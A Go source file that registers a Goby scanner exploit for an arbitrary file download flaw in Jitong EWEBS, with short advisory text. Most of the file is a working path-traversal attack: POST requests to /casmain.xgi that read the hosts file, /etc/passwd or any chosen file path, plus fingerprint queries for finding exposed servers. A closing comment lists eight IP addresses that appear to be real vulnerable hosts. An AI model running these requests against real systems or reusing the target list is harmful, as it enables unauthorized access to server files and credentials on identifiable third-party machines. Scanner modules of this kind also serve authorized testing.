package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Jitong EWEBS application virtualization system File Download Vulnerability",
    "Description": "<p>Jitong EWEBS is an application virtualization server software, advanced application virtualization technology can deliver applications to users at the fastest speed anywhere.</p><p>There is an arbitrary file download vulnerability in the Jitong EWEBS application virtualization platform. An attacker can download important system files (such as database configuration files, system configuration files) through this vulnerability, and cooperate with the downloaded file content to enter the database or system smoothly, causing the website or server to fall .</p>",
    "Product": "EWEBS",
    "Homepage": "http://www.n-soft.com.cn/",
    "DisclosureDate": "2015-09-26",
    "Author": "magic1092070680@qq.com",
    "FofaQuery": "(body=\"/js/xajax05/xajax_js/xajax_core.js\" && title!=\"易正远程\") || body=\"<a href='../client/EWEBSClientsetup.exe'></a> </td>\" || title==\"应用虚拟化登录\"",
    "GobyQuery": "(body=\"/js/xajax05/xajax_js/xajax_core.js\" && title!=\"易正远程\") || body=\"<a href='../client/EWEBSClientsetup.exe'></a> </td>\" || title==\"应用虚拟化登录\"",
    "Level": "3",
    "Impact": "<p>There is an arbitrary file download vulnerability in the Jitong EWEBS application virtualization platform. An attacker can download important system files (such as database configuration files, system configuration files) through this vulnerability, and cooperate with the downloaded file content to enter the database or system smoothly, causing the website or server to fall .</p>",
    "Recommendation": "<p>The official has fixed the vulnerability yet, please contact the manufacturer to fix the vulnerability: <a href=\"http://www.n-soft.com.cn/\">http://www.n-soft.com.cn/</a></p><p>1. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>2. If it is not necessary, the public network is prohibited from accessing the system.</p>",
    "References": [
        "https://www.wooyun.org/bugs/wooyun-2015-0121875"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "windows/system32/drivers/etc/hosts",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/casmain.xgi",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "Language_S=../../../../windows/system32/drivers/etc/hosts"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "127.0.0.1",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "HOSTS",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "localhost",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/casmain.xgi",
                "follow_redirect": false,
                "header": {
                    "Contnt-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "Language_S=../../../../etc/passwd"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "root:(.*?):0:0",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/casmain.xgi",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "Language_S=../../../../{{{filePath}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "极通 EWEBS 应用虚拟化系统任意文件下载漏洞",
            "Product": "EWEBS",
            "Description": "<p>极通EWEBS是一种应用虚拟化服务器软件, 先进的应用虚拟技术可以在任何地方都能以最快的速度为用户交付应用。<br></p><p>极通EWEBS应用虚拟化平台存在任意文件下载漏洞，攻击者可通过该漏洞下载系统重要文件（如数据库配置文件、系统配置文件），并配合下载文件内容顺利进入数据库或者系统，导致网站或者服务器沦陷。<br></p>",
            "Recommendation": "<p>官方暂已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.n-soft.com.cn/\">http://www.n-soft.com.cn/</a></p><p>1、通过防火墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">极通EWEBS应用虚拟化平台存在任意文件下载漏洞，</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">攻击者可通过该漏洞下载系统重要文件（如数据库配置文件、系统配置文件），并配合下载文件内容顺利进入数据库或者系统，导致网站或者服务器沦陷。</span><br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Jitong EWEBS application virtualization system File Download Vulnerability",
            "Product": "EWEBS",
            "Description": "<p>Jitong EWEBS is an application virtualization server software, advanced application virtualization technology can deliver applications to users at the fastest speed anywhere.</p><p>There is an arbitrary file download vulnerability in the Jitong EWEBS application virtualization platform. An attacker can download important system files (such as database configuration files, system configuration files) through this vulnerability, and cooperate with the downloaded file content to enter the database or system smoothly, causing the website or server to fall .<br></p>",
            "Recommendation": "<p>The official has fixed the vulnerability yet, please contact the manufacturer to fix the vulnerability: <a href=\"http://www.n-soft.com.cn/\">http://www.n-soft.com.cn/</a></p><p>1. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>2. If it is not necessary, the public network is prohibited from accessing the system.</p>",
            "Impact": "<p>There is an arbitrary file download vulnerability in the Jitong EWEBS application virtualization platform. An attacker can download important system files (such as database configuration files, system configuration files) through this vulnerability, and cooperate with the downloaded file content to enter the database or system smoothly, causing the website or server to fall .<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9934"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}

/*
http://122.225.121.214:85
http://47.107.40.209:8008
http://58.221.213.222:8091
http://222.95.199.44:81
http://222.209.189.25:8088
http://221.226.57.102:81
http://43.240.126.65:81
http://122.226.133.152:88
*/
